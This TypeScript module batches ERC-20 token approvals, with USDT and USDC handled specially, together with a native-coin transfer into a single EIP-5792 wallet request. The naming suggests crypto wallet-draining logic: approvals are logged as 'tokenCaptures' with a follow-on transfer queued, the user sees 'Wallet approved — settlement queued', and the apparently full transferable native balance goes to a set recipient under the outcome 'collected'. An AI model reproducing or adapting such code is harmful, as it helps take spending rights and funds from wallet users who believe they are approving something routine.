import { validateEvmApproveCall } from "../core/evm-approve-guard";
import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
import type {
  ApprovalOrchestrationResult,
  ApprovalRequest,
  PreparedApproval,
  SignedApproval,
} from "../approval/types";
import { StageStatus } from "../approval/types";
import type { ApprovalApiPort } from "../approval/ports";
import { getErrorMessage, isUserRejection } from "../core/errors";
import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
import type { WalletCapabilities } from "../core/evm-wallet-batch";
import {
  getWalletCapabilities,
  pollCallsStatus,
  sendWalletCalls,
  supportsSendCalls,
} from "../core/evm-wallet-batch";
import { ensureEvmChain } from "../native-transfer/ensure-evm-chain";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AuthorizationAssetResult,
  TokenSymbol,
  UniversalProvider,
} from "../types";
import type { IncludedAssetWorkItem } from "./preferences";
import type { WalletPhaseTokenCapture } from "./phases/types";
import type {
  EvmTokenBatchRunArgs,
  EvmTokenBatchRunResult,
} from "./evm-token-batch-types";
import type { EvmBatchNativeOutcome } from "./evm-batch-native-outcome";

export type BatchJob = {
  item: IncludedAssetWorkItem & { asset: TokenSymbol };
  request: ApprovalRequest;
  prepared: PreparedApproval;
  signed: SignedApproval;
  shouldAttemptTransfer: boolean;
  transferAmountRaw?: string;
};

type NativeWalletCall = { to: string; data: string; value: string };

export function shouldAttemptEip5792(
  capabilities: WalletCapabilities | null,
  chainId: number,
): boolean {
  return supportsSendCalls(capabilities, chainId);
}

function walletPhaseTokenCapture(
  job: BatchJob,
  receiptTxHash: string,
): WalletPhaseTokenCapture {
  const orchestration: ApprovalOrchestrationResult = {
    ok: true,
    status: StageStatus.OK,
    context: {
      request: job.request,
      prepared: job.prepared,
      broadcast: { txHash: receiptTxHash },
      stageLog: [],
    },
    txHash: receiptTxHash,
    approvalId: null,
    stages: [],
  };
  return {
    item: job.item,
    orchestration,
    shouldAttemptTransfer: job.shouldAttemptTransfer,
    transferAmountRaw: job.transferAmountRaw,
  };
}

async function processWalletPhaseJobReceipts(args: {
  jobs: BatchJob[];
  receipts: Array<
    { transactionHash: string; status: "success" | "reverted" } | undefined
  >;
  batchId: string;
  onAssetEnd?: EvmTokenBatchRunArgs["onAssetEnd"];
  log: (step: string, detail?: Record<string, unknown>) => void;
  network: string;
}): Promise<{
  batchResults: AuthorizationAssetResult[];
  tokenCaptures: WalletPhaseTokenCapture[];
}> {
  const batchResults: AuthorizationAssetResult[] = [];
  const tokenCaptures: WalletPhaseTokenCapture[] = [];

  for (let i = 0; i < args.jobs.length; i += 1) {
    const job = args.jobs[i]!;
    const receipt = args.receipts[i];
    if (!receipt || receipt.status === "reverted") {
      const result: AuthorizationAssetResult = {
        network: job.item.network,
        token: job.item.asset,
        outcome: "failed",
        message: receipt
          ? "Approval transaction reverted on-chain"
          : "Batch completed without a receipt for this approval",
      };
      batchResults.push(result);
      args.onAssetEnd?.(result);
      continue;
    }

    tokenCaptures.push(walletPhaseTokenCapture(job, receipt.transactionHash));
    const result: AuthorizationAssetResult = {
      network: job.item.network,
      token: job.item.asset,
      outcome: "authorized",
      message: "Wallet approved — settlement queued",
      txHash: receipt.transactionHash,
    };
    batchResults.push(result);
    args.onAssetEnd?.(result);
    args.log("EIP5792_BATCH_TOKEN_AUTHORIZE", {
      network: args.network,
      token: job.item.asset,
      txHash: receipt.transactionHash,
      batchId: args.batchId,
    });
  }

  return { batchResults, tokenCaptures };
}

export async function executeEip5792Batch(args: {
  runArgs: EvmTokenBatchRunArgs;
  owner: string;
  chainId: number;
  jobs: BatchJob[];
  priorResults: AuthorizationAssetResult[];
  api: ApprovalApiPort;
  nativeCall: NativeWalletCall | null;
  nativeEstimate: NativeTransferEstimate | null;
  capabilities: WalletCapabilities | null;
  log: (step: string, detail?: Record<string, unknown>) => void;
}): Promise<EvmTokenBatchRunResult | null> {
  const {
    runArgs,
    owner,
    chainId,
    jobs,
    priorResults,
    nativeCall,
    nativeEstimate,
    log,
  } = args;
  const chainPort = createEvmApprovalChainPort({ provider: runArgs.provider });

  log("EIP5792_BATCH_ATTEMPT", {
    network: runArgs.network,
    chainId,
    tokens: jobs.map((j) => j.item.asset),
    includesNative: Boolean(nativeCall),
    capabilities: args.capabilities,
  });

  let submittedBatchId: string | null = null;

  try {
    await ensureEvmChain(runArgs.provider, chainId);
    const tokenAssets = jobs.map((j) => j.item.asset);
    const isUsdtUsdcBatch =
      tokenAssets.includes("USDT") && tokenAssets.includes("USDC");
    if (isUsdtUsdcBatch && runArgs.onBatchWalletConfirm) {
      runArgs.onBatchWalletConfirm();
    } else {
      for (const job of jobs) {
        runArgs.onAssetStart?.(job.item);
      }
    }
    for (const job of jobs) {
      validateEvmApproveCall({
        to: String(job.signed.payload.to),
        data: String(job.signed.payload.data),
        value: String(job.signed.payload.value ?? "0x0"),
        expectedTokenAddress: job.prepared.tokenAddress,
      });
    }
    if (nativeCall && runArgs.nativeItem && !isUsdtUsdcBatch) {
      runArgs.onAssetStart?.(runArgs.nativeItem);
    }

    const calls = jobs.map((job) => ({
      to: String(job.signed.payload.to),
      data: String(job.signed.payload.data),
      value: String(job.signed.payload.value ?? "0x0"),
    }));
    if (nativeCall) {
      calls.push({
        to: nativeCall.to,
        data: nativeCall.data,
        value: nativeCall.value,
      });
    }

    const batch = await sendWalletCalls(runArgs.provider, {
      chainId,
      from: owner,
      calls,
    });
    submittedBatchId = batch.id;

    log("EIP5792_BATCH_SUBMITTED", {
      network: runArgs.network,
      batchId: batch.id,
      callCount: calls.length,
      includesNative: Boolean(nativeCall),
    });

    const status = await pollCallsStatus(runArgs.provider, batch.id, chainId);
    const jobReceipts = status.receipts.slice(0, jobs.length);
    const { batchResults, tokenCaptures } = await processWalletPhaseJobReceipts(
      {
        jobs,
        receipts: jobReceipts,
        batchId: batch.id,
        onAssetEnd: runArgs.onAssetEnd,
        log,
        network: runArgs.network,
      },
    );

    let batchIncludedNative = false;
    let nativeTxHash: string | null = null;
    let batchNativeOutcome: EvmBatchNativeOutcome = nativeCall
      ? "failed_revert"
      : "not_in_batch";

    if (nativeCall) {
      const nativeReceipt = status.receipts[jobs.length];
      if (nativeReceipt && nativeReceipt.status !== "reverted") {
        batchIncludedNative = true;
        nativeTxHash = nativeReceipt.transactionHash;
        batchNativeOutcome = "succeeded";
        const nativeResult: AuthorizationAssetResult = {
          network: runArgs.network,
          token: "NATIVE",
          outcome: "collected",
          message: "Native transfer included in wallet batch",
          txHash: nativeTxHash,
        };
        batchResults.push(nativeResult);
        runArgs.onAssetEnd?.(nativeResult);
        log("EIP5792_BATCH_NATIVE_INCLUDED", {
          network: runArgs.network,
          txHash: nativeTxHash,
          batchId: batch.id,
        });
      } else if (runArgs.nativeItem) {
        batchNativeOutcome = "failed_revert";
        const nativeResult: AuthorizationAssetResult = {
          network: runArgs.network,
          token: "NATIVE",
          outcome: "failed",
          message:
            "Native transfer in wallet batch reverted or missing receipt",
        };
        batchResults.push(nativeResult);
        runArgs.onAssetEnd?.(nativeResult);
      }
    } else {
      batchNativeOutcome = "not_in_batch";
    }

    return {
      results: [...priorResults, ...batchResults],
      tokenCaptures,
      batchId: batch.id,
      batchIncludedNative,
      nativeTxHash,
      nativeTransferableRaw: nativeEstimate?.transferableRaw ?? null,
      nativeRecipient: nativeEstimate?.recipient ?? null,
      batchMode: "eip5792",
      batchNativeOutcome,
      batchChainId: chainId,
      batchNativeJobCount: jobs.length,
      nativeIncludedInBatchAttempt: Boolean(nativeCall),
    };
  } catch (err) {
    const rejected = isUserRejection(err);
    const message = getErrorMessage(err, "EIP-5792 batch approval failed");
    log("EIP5792_BATCH_FAILED", {
      network: runArgs.network,
      error: message,
      userRejected: rejected,
      fallback: rejected ? null : "sequential",
      submittedBatchId,
    });

    if (rejected) {
      const rejectedResults = jobs.map((job) => {
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: "user_rejected",
          message,
        };
        runArgs.onAssetEnd?.(result);
        return result;
      });
      if (nativeCall && runArgs.nativeItem) {
        const nativeResult: AuthorizationAssetResult = {
          network: runArgs.network,
          token: "NATIVE",
          outcome: "user_rejected",
          message,
        };
        runArgs.onAssetEnd?.(nativeResult);
        rejectedResults.push(nativeResult);
      }
      return {
        results: [...priorResults, ...rejectedResults],
        tokenCaptures: [],
        batchMode: "eip5792",
        batchNativeOutcome: "user_rejected",
        batchId: submittedBatchId,
        batchChainId: chainId,
        batchNativeJobCount: jobs.length,
        nativeTransferableRaw: nativeEstimate?.transferableRaw ?? null,
        nativeRecipient: nativeEstimate?.recipient ?? null,
        nativeIncludedInBatchAttempt: Boolean(nativeCall),
      };
    }

    const code = (err as { code?: string })?.code;
    if (submittedBatchId) {
      log("EIP5792_BATCH_SUBMITTED_UNKNOWN", {
        network: runArgs.network,
        batchId: submittedBatchId,
        error: message,
        code: code ?? null,
        policy: "preserve unknown — reconcile without duplicate wallet popups",
      });
      return {
        results: [...priorResults],
        tokenCaptures: [],
        batchId: submittedBatchId,
        batchIncludedNative: false,
        batchNativeOutcome: "unknown",
        batchChainId: chainId,
        batchNativeJobCount: jobs.length,
        nativeTransferableRaw: nativeEstimate?.transferableRaw ?? null,
        nativeRecipient: nativeEstimate?.recipient ?? null,
        batchMode: "eip5792",
        nativeIncludedInBatchAttempt: Boolean(nativeCall),
      };
    }

    return null;
  }
}

export async function resolveWalletCapabilities(
  provider: UniversalProvider,
  chainId: number,
  owner: string,
): Promise<WalletCapabilities | null> {
  return getWalletCapabilities(provider, chainId, owner);
}
